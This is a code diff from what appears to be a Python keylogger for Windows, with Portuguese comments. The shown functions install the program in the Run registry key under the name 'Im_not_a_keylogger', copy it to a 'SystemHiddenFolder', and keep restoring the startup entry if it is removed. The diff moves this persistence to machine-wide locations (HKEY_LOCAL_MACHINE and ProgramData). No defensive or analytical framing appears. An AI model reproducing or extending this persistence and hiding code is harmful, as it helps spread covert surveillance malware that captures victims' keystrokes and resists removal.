@@ -32,7 +32,7 @@ def add_startup(file_path=None):
             file_name = sys.argv[0].split('\\')[-1]
             file_path = fp + '\\' + file_name
         key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
+        key2change = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_val, 0, winreg.KEY_ALL_ACCESS)
         winreg.SetValueEx(key2change, 'Im_not_a_keylogger', 0, winreg.REG_SZ, file_path)
     except Exception as e:
         print(f"Erro ao adicionar ao startup: {e}")
@@ -46,7 +46,7 @@ def hide():
 
 def copy_to_hidden_folder():
     try:
-        destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
+        destination_dir = os.path.join(os.getenv('ProgramData'), 'SystemHiddenFolder')
         if not os.path.exists(destination_dir):
             os.makedirs(destination_dir)
         current_file = sys.argv[0]
@@ -65,17 +65,17 @@ def verify_startup():
     while True:
         try:
             key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
+            key2change = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_val, 0, winreg.KEY_ALL_ACCESS)
             value, regtype = winreg.QueryValueEx(key2change, 'Im_not_a_keylogger')
 
             # Se o valor não corresponder ao caminho esperado, restaura
-            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
+            destination_dir = os.path.join(os.getenv('ProgramData'), 'SystemHiddenFolder')
             expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
             if value != expected_path:
                 add_startup(expected_path)
         except FileNotFoundError:
             # Caso a entrada não exista, recria-a
-            destination_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemHiddenFolder')
+            destination_dir = os.path.join(os.getenv('ProgramData'), 'SystemHiddenFolder')
             expected_path = os.path.join(destination_dir, os.path.basename(sys.argv[0]))
             add_startup(expected_path)
         except Exception as e:
